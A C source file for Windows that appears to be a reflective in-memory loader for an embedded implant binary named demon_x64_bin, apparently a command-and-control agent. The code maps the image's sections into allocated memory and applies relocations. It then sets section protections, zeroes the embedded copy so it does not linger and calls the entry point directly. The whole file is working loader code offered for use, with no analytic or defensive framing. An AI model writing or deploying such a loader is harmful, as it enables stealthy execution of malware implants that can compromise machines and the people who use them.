#include <windows.h>
#include <stdio.h>
#include "Dll.h"
#include "winnt.h"

#define C_PTR( x )          ( ( LPVOID ) x )
#define U_PTR( x )          ( ( UINT_PTR ) x )

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;


VOID Reloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}

int main()
{

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)demon_x64_bin;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid DOS header\n");
        return -1;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(demon_x64_bin + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("Invalid NT header\n");
        return -1;
    }

    PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);

    DWORD KHdrSize = sectionHeaders[0].VirtualAddress;
    DWORD KMemSize = ntHeaders->OptionalHeader.SizeOfImage - KHdrSize;

    LPVOID KVirtualMemory = VirtualAllocEx(GetCurrentProcess(), NULL, KMemSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if ( KVirtualMemory == NULL ) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        return -1;
    }

    for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        memcpy(
            C_PTR( KVirtualMemory + sectionHeaders[i].VirtualAddress - KHdrSize),
            C_PTR( demon_x64_bin + sectionHeaders[i].PointerToRawData ),
            sectionHeaders[i].SizeOfRawData
        );
    }

    PIMAGE_DATA_DIRECTORY ImageDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (ImageDir->VirtualAddress) {
        Reloc(KVirtualMemory, (PVOID) ntHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress), KHdrSize);
    }

    PVOID SecMemory = NULL;
    SIZE_T SecMemorySize = 0;
    DWORD Protection = 0;
    DWORD OldProtection = 0;

    for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        SecMemory = C_PTR( KVirtualMemory + sectionHeaders[i].VirtualAddress - KHdrSize );
        SecMemorySize = (SIZE_T) sectionHeaders[i].SizeOfRawData;
        Protection = 0;
        OldProtection = 0;

        if ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
            Protection = PAGE_WRITECOPY;

        if ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_READ )
            Protection = PAGE_READONLY;

        if ( ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            Protection = PAGE_READWRITE;

        if ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
            Protection = PAGE_EXECUTE;

        if ( ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
            Protection = PAGE_EXECUTE_WRITECOPY;

        if ( ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
        {
            Protection = PAGE_EXECUTE_READ;
        }

        if ( ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_READ ) && ( sectionHeaders[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
            Protection = PAGE_EXECUTE_READWRITE;

        if (!VirtualProtectEx(GetCurrentProcess(), SecMemory, SecMemorySize, Protection, &OldProtection)) {
            printf("Failed to change memory protection: %d\n", GetLastError());
            return -1;
        }
        
    }

    // system( "pause" );

    // memset( sectionHeaders, 0, ntHeaders->FileHeader.NumberOfSections * sizeof( IMAGE_SECTION_HEADER ) );
    
    BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
    
    memset(demon_x64_bin, 0, demon_x64_bin_len);

    KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );

    printf("This is Never Printed\n");

    // system( "pause" );

    return 0;
}

